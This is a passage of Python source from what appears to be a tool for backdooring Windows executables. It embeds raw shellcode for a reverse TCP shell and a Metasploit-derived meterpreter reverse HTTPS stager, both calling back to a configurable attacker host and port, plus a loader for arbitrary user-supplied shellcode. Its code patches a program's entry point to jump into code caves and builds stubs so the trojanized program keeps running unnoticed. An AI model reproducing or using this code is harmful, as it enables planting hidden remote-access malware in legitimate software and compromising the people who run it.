                            "\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24\x5B"
                            "\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D\x68"
                            "\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07\xFF"
                            "\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00\xFF"
                            "\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF\xD5"
                            "\x97\x6A\x05\x68"
                            )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)
        self.shellcode2 += ("\x89\xE6\x6A"
                            "\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x85\xC0\x74\x0C\xFF\x4E"
                            "\x08\x75\xEC\x68\xF0\xB5\xA2\x56\xFF\xD5\x6A\x00\x6A\x04\x56\x57"
                            "\x68\x02\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00"
                            "\x56\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53"
                            "\x57\x68\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        This module allows for the user to provide a win32 raw/binary
        shellcode.  For use with the -U flag.
        """

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode = flItms['supplied_shellcode']

        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE")
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode) + 5)

        self.shellcode1 += ("\x00\x00"
                            "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                            "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"  # <--length of shellcode below

        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(CavesPicked, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)), 16))
        #else:
        #    self.shellcode1 += "\xEB\x06\x01\x00\x00"

        #Begin shellcode 2:

        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241)), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241)), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 234)), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))
        
        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def meterpreter_reverse_https(self, flItms, CavesPicked={}):
        """
        Traditional meterpreter reverse https shellcode from metasploit
        modified to support cave jumping.
        """

        flItms['stager'] = True

        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        #shellcode1 is the thread
        self.shellcode1 = ("\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B"
                           "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02"
                           "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61"
                           "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B"
                           "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48"
                           "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0"
                           "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B"
                           "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF"
                           "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D"
                           "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B"
                           "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04"
                           "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB"
                           "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90"
                           "\x5D\x90"
                           "\xBE\x71\x01\x00\x00"  # <---Size of shellcode2 in hex
                           "\x90\x6A\x40\x90\x68\x00\x10\x00\x00"
                           "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90"
                           "\x89\xF1"
                           )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x44"   # <--length of shellcode below
        self.shellcode1 += "\x90\x5e"
        self.shellcode1 += ("\x90\x90\x90"
                            "\xF2\xA4"
                            "\xE8\x20\x00\x00"
                            "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06"
                            "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF"
                            "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5"
                            "\x58\x58\x90\x61"
                            )

        breakupvar = eat_code_caves(CavesPicked, 0, 2)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 3)), 16))
        else:
            self.shellcode1 += "\xE9\x76\x01\x00\x00"  # <---length shellcode2 + 5

        #Begin shellcode 2:
        breakupvar = eat_code_caves(CavesPicked, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 241)), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 241)), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 234)), 16))
        else:
            self.shellcode2 = "\xE8\xB7\xFF\xFF\xFF"

        self.shellcode2 += ("\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68"
                            "\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f"
                            "\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68")
        self.shellcode2 += struct.pack("<h", self.PORT)
        self.shellcode2 += ("\x00\x00\x53"
                            "\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68"
                            "\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b"
                            "\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a"
                            "\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57"
                            "\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a"
                            "\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x48\x45"
                            "\x56\x79\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00"
                            "\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff"
                            "\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68"
                            "\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85"
                            "\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 += "\x00"

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def reverse_shell_tcp(self, flItms, CavesPicked={}):
        """
        Modified metasploit windows/shell_reverse_tcp shellcode
        to enable continued execution and cave jumping.
        """
        #breakupvar is the distance between codecaves

        breakupvar = eat_code_caves(CavesPicked, 0, 1)
        self.shellcode1 = "\xfc\xe8"

        if flItms['cave_jumping'] is True:
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4)), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4)), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\x89\x00\x00\x00"

        self.shellcode1 += ("\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
                            "\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
                            "\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
                            "\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
                            "\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
                            "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
                            "\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
                            "\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
                            )

        self.shellcode2 = ("\x5d\x68\x33\x32\x00\x00\x68"
                           "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
                           "\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
                           "\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x89\xc7"
                           "\x68"
                           )
        self.shellcode2 += self.pack_ip_addresses()  # IP
        self.shellcode2 += ("\x68\x02\x00")
        self.shellcode2 += struct.pack('!h', self.PORT)  # PORT
        self.shellcode2 += ("\x89\xe6\x6a\x10\x56"
                            "\x57\x68\x99\xa5\x74\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3"
                            "\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24"
                            "\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56"
                            "\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89"
                            #The NOP in the line below allows for continued execution.
                            "\xe0\x4e\x90\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0"
                            "\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80"
                            "\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
                            "\x81\xc4\xfc\x01\x00\x00"
                            )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)


def assembly_entry(InstrSets, CurrInstr, instr_length, count, CurrRVA):
    if hex(CurrInstr) in opcode64:
        opcode_length = opcode64[hex(CurrInstr)]
    elif hex(CurrInstr) in opcode32:
        opcode_length = opcode32[hex(CurrInstr)]
    if instr_length == 7:
        InstrSets[CurrInstr] = (struct.unpack('<Q', f.read(7) + '\x00')[0])
    if instr_length == 6:
        InstrSets[CurrInstr] = (struct.unpack('<Q', f.read(6) + '\x00\x00')[0])
    if instr_length == 5:
        InstrSets[CurrInstr] = (struct.unpack('<Q', f.read(5) +
                                              '\x00\x00\x00')[0])
    if instr_length == 4:
        InstrSets[CurrInstr] = struct.unpack('<I', f.read(4))[0]
    if instr_length == 3:
        InstrSets[CurrInstr] = struct.unpack('<I', f.read(3) + '\x00')[0]
    if instr_length == 2:
        InstrSets[CurrInstr] = struct.unpack('<H', f.read(2))[0]
    if instr_length == 1:
        InstrSets[CurrInstr] = struct.unpack('<B', f.read(1))[0]
    if instr_length == 0:
        InstrSets[CurrInstr] = 0
    flItms['VrtStrtngPnt'] = (flItms['VrtStrtngPnt'] +
                              opcode_length)
    CallValue = (InstrSets[CurrInstr] +
                 flItms['VrtStrtngPnt'] +
                 opcode_length)
    flItms['ImpList'].append([CurrRVA, InstrSets, CallValue,
                             flItms['VrtStrtngPnt'],
                             instr_length])
    count += opcode_length
    return InstrSets, flItms, count


def pe64_entry_instr(flItms):
    """
    For x64 files
    """

    print "[*] Reading win64 entry instructions"
    f.seek(flItms['LocOfEntryinCode'])
    count = 0
    loop_count = 0
    flItms['ImpList'] = []
    check64 = 0
    while True:
        #need to count offset from vrtstartingpoint
        InstrSets = {}
        if check64 >= 4:
            check32 = True
        else:
            check32 = False
        for i in range(1, 5):
            f.seek(flItms['LocOfEntryinCode'] + count)
            CurrRVA = flItms['VrtStrtngPnt'] + count
            if i == 1:
                CurrInstr = struct.unpack('!B', f.read(i))[0]
            elif i == 2:
                CurrInstr = struct.unpack('!H', f.read(i))[0]
            elif i == 3:
                CurrInstr = struct.unpack('!I', '\x00' + f.read(3))[0]
            elif i == 4:
                CurrInstr = struct.unpack('!I', f.read(i))[0]
            if check32 is False:
                if hex(CurrInstr) in opcode64:
                    instr_length = opcode64[hex(CurrInstr)] - i
                    InstrSets, flItms, count = assembly_entry(InstrSets,
                                                              CurrInstr,
                                                              instr_length,
                                                              count,
                                                              CurrRVA)
                    check64 = 0
                    break
                else:
                    check64 += 1
            elif check32 is True:
                if hex(CurrInstr) in opcode32:
                    instr_length = opcode32[hex(CurrInstr)] - i
                    InstrSets, flItms, count = assembly_entry(InstrSets,
                                                              CurrInstr,
                                                              instr_length,
                                                              count,
                                                              CurrRVA)
                    break

        if count >= 6 or count % 5 == 0 and count != 0:
            break

        loop_count += 1
        if loop_count >= 10:
            print "This program's initial opCodes are not planned for"
            print "Please contact the developer."
            flItms['supported'] = False
            break
    return flItms, count


def pe32_entry_instr(flItms):
    """
    This fuction returns a list called flItms['ImpList'] that tracks the first
    couple instructions for reassembly after the shellcode executes.
    If there are pe entry instructions that are not mapped here,
    please send me the first 15 bytes (3 to 4 instructions on average)
    for the executable entry point once loaded in memory.  If you are
    familiar with olly/immunity it is the first couple instructions
    when the program is first loaded.
    """
    print "[*] Reading win32 entry instructions"
    f.seek(flItms['LocOfEntryinCode'])
    count = 0
    loop_count = 0
    flItms['ImpList'] = []
    while True:
        InstrSets = {}
        for i in range(1, 5):
            f.seek(flItms['LocOfEntryinCode'] + count)
            CurrRVA = flItms['VrtStrtngPnt'] + count
            if i == 1:
                CurrInstr = struct.unpack('!B', f.read(i))[0]
            elif i == 2:
                CurrInstr = struct.unpack('!H', f.read(i))[0]
            elif i == 3:
                CurrInstr = struct.unpack('!I', '\x00' + f.read(3))[0]
            elif i == 4:
                CurrInstr = struct.unpack('!I', f.read(i))[0]
            if hex(CurrInstr) in opcode32:
                instr_length = opcode32[hex(CurrInstr)] - i
                InstrSets, flItms, count = assembly_entry(InstrSets,
                                                          CurrInstr,
                                                          instr_length,
                                                          count,
                                                          CurrRVA)
                break

        if count >= 6 or count % 5 == 0 and count != 0:
            break

        loop_count += 1
        if loop_count >= 4:
            print "This program's initial opCodes are not planned for"
            print "Please contact the developer."
            flItms['supported'] = False
            break
    return flItms, count


def patch_initial_instructions(flItms):
    """
    This function takes the flItms dict and patches the
    executable entry point to jump to the first code cave.
    """
    print "[*] Patching initial entry instructions"

    f.seek(flItms['LocOfEntryinCode'])
    #This is the JMP command in the beginning of the
    #code entry point that jumps to the codecave
    f.write(struct.pack('=B', int('E9', 16)))
    f.write(struct.pack('<I', flItms['JMPtoCodeAddress']))
    #align the stack if the first OpCode+instruction is less
    #than 5 bytes fill with nops to align everything. Not a for loop.
    FrstOpCode = flItms['ImpList'][0][1].keys()[0]

    if hex(FrstOpCode) in opcode64:
        opcode_length = opcode64[hex(FrstOpCode)]
    elif hex(FrstOpCode) in opcode32:
        opcode_length = opcode32[hex(FrstOpCode)]
    if opcode_length == 7:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=B', int('90', 16)))
    if opcode_length == 6:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
    if opcode_length == 5:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            #f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
            pass
    if opcode_length == 4:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=BB', int('90', 16)))
    if opcode_length == 3:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=B', int('90', 16)))
    if opcode_length == 2:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=BB', int('90', 16), int('90', 16)))
    if opcode_length == 1:
        if flItms['count_bytes'] % 5 != 0 and flItms['count_bytes'] < 5:
            f.write(struct.pack('=BBB', int('90', 16),
                                int('90', 16),
                                int('90', 16)))


def opcode_return(OpCode, instr_length):
    _, OpCode = hex(OpCode).split('0x')
    OpCode = unhexlify(OpCode)
    return OpCode


def resume_execution_64(flItms):
    """
    For x64 exes...
    """

    print "[*] Creating win64 resume execution stub"
    resumeExe = ''
    total_opcode_len = 0
    for item in flItms['ImpList']:
        OpCode_address = item[0]
        OpCode = item[1].keys()[0]
        instruction = item[1].values()[0]
        ImpValue = item[2]
        instr_length = item[4]
        if hex(OpCode) in opcode64:
            total_opcode_len += opcode64[hex(OpCode)]
        elif hex(OpCode) in opcode32:
            total_opcode_len += opcode32[hex(OpCode)]
        else:
            "Warning OpCode not found"
        if verbose is True:
            if instruction:
                print 'instruction', hex(instruction)
            else:
                print "single opcode, no instruction"

        compliment_one, compliment_two = ones_compliment()

        if OpCode == int('e8', 16):  # Call instruction
            resumeExe += "\x48\x89\xd0"  # mov rad,rdx
            resumeExe += "\x48\x83\xc0"  # add rax,xxx
            resumeExe += struct.pack("<B", total_opcode_len)  # length from vrtstartingpoint after call
            resumeExe += "\x50"  # push rax
            if instruction <= 4294967295:
                resumeExe += "\x48\xc7\xc1"  # mov rcx, 4 bytes
                resumeExe += struct.pack("<I", instruction)
            elif instruction > 4294967295:
                resumeExe += "\x48\xb9"  # mov rcx, 8 bytes
                resumeExe += struct.pack("<Q", instruction)
            else:
                print "So close.."
                print ("Contact the dev with the exe and instruction=",
                       instruction)
                sys.exit()
            resumeExe += "\x48\x01\xc8"  # add rax,rcx
            #-----
            resumeExe += "\x50"
            resumeExe += "\x48\x31\xc9"  # xor rcx,rcx
            resumeExe += "\x48\x89\xf0"  # mov rax, rsi
            resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
            resumeExe += compliment_one
            resumeExe += "\x48\x81\xe6"  # and rsi, XXXX
            resumeExe += compliment_two
            resumeExe += "\xc3"
            ReturnTrackingAddress = item[3]
            return ReturnTrackingAddress, resumeExe

        elif OpCode in jump_codes:
            #Let's beat ASLR
            resumeExe += "\xb8"
            aprox_loc_wo_alsr = (flItms['VrtStrtngPnt'] +
                                 flItms['JMPtoCodeAddress'] +
                                 len(shellcode) + len(resumeExe) +
                                 200 + flItms['buffer'])
            resumeExe += struct.pack("<I", aprox_loc_wo_alsr)
            resumeExe += struct.pack('=B', int('E8', 16))  # call
            resumeExe += "\x00" * 4
            # POP ECX to find location
            resumeExe += struct.pack('=B', int('59', 16))
            resumeExe += "\x2b\xc1"  # sub eax,ecx
            resumeExe += "\x3d\x00\x05\x00\x00"  # cmp eax,500
            resumeExe += "\x77\x0b"  # JA (14)
            resumeExe += "\x83\xC1\x16"
            resumeExe += "\x51"
            resumeExe += "\xb8"  # Mov EAX ..
            if OpCode is int('ea', 16):  # jmp far
                resumeExe += struct.pack('<BBBBBB', ImpValue)
            elif ImpValue > 429467295:
                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
            else:
                resumeExe += struct.pack('<I', ImpValue)  # Add+ EAX, CallValue
            resumeExe += "\x50\xc3"
            resumeExe += "\x8b\xf0"
            resumeExe += "\x8b\xc2"
            resumeExe += "\xb9"
            resumeExe += struct.pack('<I', flItms['VrtStrtngPnt'])
            resumeExe += "\x2b\xc1"
            resumeExe += "\x05"
            if OpCode is int('ea', 16):  # jmp far
                resumeExe += struct.pack('<BBBBBB', ImpValue)
            elif ImpValue > 429467295:
                resumeExe += struct.pack('<I', abs(ImpValue - 0xffffffff + 2))
            else:
                resumeExe += struct.pack('<I', ImpValue - 5)
            resumeExe += "\x50"
            resumeExe += "\x33\xc9"
            resumeExe += "\x8b\xc6"
            resumeExe += "\x81\xe6"
            resumeExe += compliment_one
            resumeExe += "\x81\xe6"
            resumeExe += compliment_two
            resumeExe += "\xc3"
            ReturnTrackingAddress = item[3]
            return ReturnTrackingAddress, resumeExe

        elif instr_length == 7:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 6:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 5:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBBBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 4:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<I", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 3:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<BBB", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 2:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<H", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 1:
            resumeExe += opcode_return(OpCode, instr_length)
            resumeExe += struct.pack("<B", instruction)
            ReturnTrackingAddress = item[3]

        elif instr_length == 0:
            resumeExe += opcode_return(OpCode, instr_length)
            ReturnTrackingAddress = item[3]

    resumeExe += "\x49\x81\xe7"
    resumeExe += compliment_one  # zero out r15
    resumeExe += "\x49\x81\xe7"
    resumeExe += compliment_two  # zero out r15
    resumeExe += "\x49\x81\xc7"  # ADD r15 <<-fix it this a 4 or 8 byte add does it matter?
    if ReturnTrackingAddress >= 4294967295:
        resumeExe += struct.pack('<Q', ReturnTrackingAddress)
    else:
        resumeExe += struct.pack('<I', ReturnTrackingAddress)
    resumeExe += "\x41\x57"  # push r15
    resumeExe += "\x49\x81\xe7"  # zero out r15
    resumeExe += compliment_one
    resumeExe += "\x49\x81\xe7"  # zero out r15
    resumeExe += compliment_two
    resumeExe += "\xC3"
    return ReturnTrackingAddress, resumeExe


def resume_execution_32(flItms):
    """
